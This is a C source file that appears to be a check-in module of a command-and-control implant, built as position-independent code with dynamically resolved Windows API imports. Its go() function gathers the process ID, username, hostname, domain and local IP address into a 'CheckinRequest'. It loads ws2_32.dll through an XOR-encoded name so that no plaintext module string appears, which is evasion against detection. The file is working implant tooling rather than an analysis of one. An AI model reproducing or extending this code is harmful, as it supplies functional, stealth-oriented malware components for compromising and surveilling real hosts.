#define SECURITY_WIN32

#include <winsock2.h>
#include <windows.h>
#include <lm.h>
#include <security.h>
#include "../headers/celebi.h"

WINBASEAPI DWORD KERNEL32$GetCurrentProcessId();
WINBASEAPI BOOL KERNEL32$GetComputerNameA(LPSTR lpBuffer, LPDWORD nSize);
WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
WINBASEAPI BOOL WINAPI KERNEL32$VirtualFree(LPVOID lpAddress, SIZE_T dwSize, DWORD  dwFreeType);
WINBASEAPI HMODULE WINAPI KERNEL32$LoadLibraryA(LPCSTR lpLibFileName);

WINBASEAPI BOOLEAN WINAPI SECUR32$GetUserNameExA(int NameFormat, LPSTR lpNameBuffer, PULONG nSize);
WINBASEAPI NET_API_STATUS WINAPI NETAPI32$NetWkstaGetInfo(LMSTR, DWORD, LPBYTE*);
WINBASEAPI NET_API_STATUS WINAPI NETAPI32$NetApiBufferFree(LPVOID);

WINBASEAPI int WINAPI WS2_32$WSAStartup(WORD wVersionRequested, void *lpWSAData);
WINBASEAPI int WINAPI WS2_32$gethostname(char *name, int namelen);
WINBASEAPI struct hostent * WINAPI WS2_32$gethostbyname(const char *name);

/* Load a DLL whose name is stored XOR-encoded (no plaintext module names in
 * the PIC). PICO objects are self-contained, so this is a local copy. */
static void *pico_load_module_xor(const unsigned char *encoded, int encoded_len, unsigned char key) {
	char name[64];
	int i;
	for (i = 0; i < encoded_len && i < 63; i++) {
		name[i] = (char)(encoded[i] ^ key);
	}
	name[i] = '\0';
	return KERNEL32$LoadLibraryA(name);
}

void go(CheckinRequest *req) {
	DWORD len;
	
	req->pid = KERNEL32$GetCurrentProcessId();
	
	// GetUserNameExA/GetComputerNameA take the buffer size in *nSize on INPUT.
	// Leaving it uninitialized makes success depend on stack garbage.
	char *username = KERNEL32$VirtualAlloc(0, 256, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
	len = 256;
	if (SECUR32$GetUserNameExA(NameSamCompatible, username, &len) == TRUE) {
		req->username = username;
	} else {
		KERNEL32$VirtualFree(username, 0, MEM_RELEASE);
	}
	
	char *hostname = KERNEL32$VirtualAlloc(0, 256, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
	len = 256;
	if (KERNEL32$GetComputerNameA(hostname, &len) == TRUE) {
		req->hostname = hostname;
	} else {
		KERNEL32$VirtualFree(hostname, 0, MEM_RELEASE);
	}
	
	LPWKSTA_INFO_100 workstationInfo = { 0 };
	NET_API_STATUS status = NETAPI32$NetWkstaGetInfo(NULL, 100, (LPBYTE *) &workstationInfo);
	if (status == NERR_Success) {
		req->domain = KERNEL32$VirtualAlloc(0, 256, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
		for (int i = 0; i < 256; i++) {
			req->domain[i] = workstationInfo->wki100_langroup[i];
			if (req->domain[i] == 0) {
				break;
			}
		}
	}
	NETAPI32$NetApiBufferFree(workstationInfo);
	
	// Report the host's local IPv4 (gethostname + gethostbyname, first result).
	/* "ws2_32.dll" ^ 0x4A — load it without a plaintext name (ror13 only
	 * resolves loaded modules; the PICO may run in a fresh process). */
	{
		static const unsigned char WS2_32_XOR[] = {0x3d, 0x39, 0x78, 0x15, 0x79, 0x78, 0x64, 0x2e, 0x26, 0x26};
		pico_load_module_xor(WS2_32_XOR, sizeof(WS2_32_XOR), 0x4A);
	}
	WSADATA wsa;
	WS2_32$WSAStartup(MAKEWORD(2, 2), &wsa);
	char localname[256];
	if (WS2_32$gethostname(localname, sizeof(localname)) == 0) {
		struct hostent *he = WS2_32$gethostbyname(localname);
		if (he != NULL && he->h_addrtype == AF_INET && he->h_addr_list[0] != NULL) {
			unsigned char *a = (unsigned char *)he->h_addr_list[0];
			char *ip = KERNEL32$VirtualAlloc(0, 32, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
			if (ip != NULL) {
				/* build "a.b.c.d" manually (no sprintf import in the PIC) */
				char *p = ip;
				for (int i = 0; i < 4; i++) {
					int v = a[i];
					char tmp[4];
					int n = 0;
					if (v == 0) { tmp[n++] = '0'; }
					while (v > 0) { tmp[n++] = (char)('0' + (v % 10)); v /= 10; }
					while (n > 0) { *p++ = tmp[--n]; }
					if (i < 3) { *p++ = '.'; }
				}
				*p = '\0';
				req->ip = ip;
			}
		}
	}
}
